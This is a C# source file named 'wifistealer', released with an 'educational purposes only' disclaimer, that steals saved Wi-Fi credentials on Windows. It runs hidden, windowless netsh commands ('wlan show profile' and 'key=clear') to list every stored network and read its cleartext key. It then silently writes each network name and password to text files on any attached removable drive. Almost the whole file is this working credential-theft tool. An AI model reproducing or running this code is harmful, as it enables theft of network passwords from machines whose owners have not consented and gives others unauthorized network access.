using System;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace wifistealer;
/* Description:
This software was made and is own by Xnetwolf
The use of it is free of charge it can be use for private use or any other use

This program is for educational purposes only! I take no responsibility or liability for own personal use.

If you want to contribute feel free to open an issue or make a pull request
*/
// Program class
    class Program{

    [STAThread]
    public void runforms()
    {
        // To customize application configuration such as set high DPI settings or default font,
        // see https://aka.ms/applicationconfiguration.
        ApplicationConfiguration.Initialize();
        Application.Run(new Form1());
    }    
    static void Main(string[] args){
       // Console.WriteLine("started");
       int a = 1;
       if (a == 1 ){
        attack t = new attack();
        t.get_passwords();
       }
      

        }

    }
    class attack{  
        // Global variables
        int count = 0; // Number of lines from netsh command
        int count_names = 0; // Number of total names
        DataTable table = new DataTable();

        #region console functions
        private string wifilist()
        {
            // netsh wlan show profile
            Process processWifi = new Process();
            processWifi.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            processWifi.StartInfo.FileName = "netsh";
            processWifi.StartInfo.Arguments = "wlan show profile";
            //processWifi.StartInfo.WorkingDirectory = Path.GetDirectoryName(YourApplicationPath);

            processWifi.StartInfo.UseShellExecute = false;
            processWifi.StartInfo.RedirectStandardError = true;
            processWifi.StartInfo.RedirectStandardInput = true;
            processWifi.StartInfo.RedirectStandardOutput = true;
            processWifi.StartInfo.CreateNoWindow = true;
            processWifi.Start();
            //* Read the output (or the error)
            string output = processWifi.StandardOutput.ReadToEnd();
            // Show output commands
            string err = processWifi.StandardError.ReadToEnd();
            // show error commands
            processWifi.WaitForExit();
            return output;
        }
        private string wifipassword(string wifiname)
        {
            // netsh wlan show profile name=* key=clear
            string argument = "wlan show profile name=\"" + wifiname + "\" key=clear";
            Process processWifi = new Process();
            processWifi.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            processWifi.StartInfo.FileName = "netsh";
            processWifi.StartInfo.Arguments = argument;
            //processWifi.StartInfo.WorkingDirectory = Path.GetDirectoryName(YourApplicationPath);

            processWifi.StartInfo.UseShellExecute = false;
            processWifi.StartInfo.RedirectStandardError = true;
            processWifi.StartInfo.RedirectStandardInput = true;
            processWifi.StartInfo.RedirectStandardOutput = true;
            processWifi.StartInfo.CreateNoWindow = true;
            processWifi.Start();
            //* Read the output (or the error)
            string output = processWifi.StandardOutput.ReadToEnd();
            // Show output commands
            string err = processWifi.StandardError.ReadToEnd();
            // show error commands
            processWifi.WaitForExit();
            return output;
        }
        private string wifipassword_single(string wifiname)
        {
            string get_password = wifipassword(wifiname); // Get the chunk from console that returns the wifi password           
            using (StringReader reader = new StringReader(get_password))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    Regex regex2 = new Regex(@"Key Content * : (?<after>.*)"); // Passwords
                    Match match2 = regex2.Match(line);

                    if (match2.Success)
                    {
                        string current_password = match2.Groups["after"].Value;
                        return current_password;
                    }
                }
            }
            return "Open Network";
        }
            #endregion
        #region process data for wifi names
            private void parse_lines(string input)
        {
            // Reads the string
            using (StringReader reader = new StringReader(input))
            {
                // Loop over the lines in the string.
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    count++;
                    regex_lines(line);
                  //command_dump(line);
                }
            }
        }
        
        #endregion
        #region regex
        private void regex_lines(string input2)
        {
            Regex regex1 = new Regex(@"All User Profile * : (?<after>.*)"); // Wifi Names
            Match match1 = regex1.Match(input2); // Wifi Names
            
            if (match1.Success)
            {
                count_names++;
                string current_name = match1.Groups["after"].Value;
                string password = wifipassword_single(current_name);
                Console.WriteLine($"wifi name: {current_name} \npassword:{password}");
                string list = $"wifi name: {current_name} \npassword:{password}";
                DriveInfo[] drives = DriveInfo.GetDrives();
           foreach (DriveInfo drive in drives)
           {
               // check for external drive
             if ((drive.DriveType == DriveType.Removable) && (drive.IsReady))
             {
               // Console.WriteLine(drive);
                try{
                    // Edit this you can use File.append()
                File.WriteAllText(@$"{drive}{current_name}.txt", list);
                }
                catch{}
                
            }

            }
        }

    }

        public void get_passwords()
        {
            string wifidata = wifilist(); // Gets Wifi Names to String
            parse_lines(wifidata); // Process each line of the string
        }
#endregion
        
    }

 
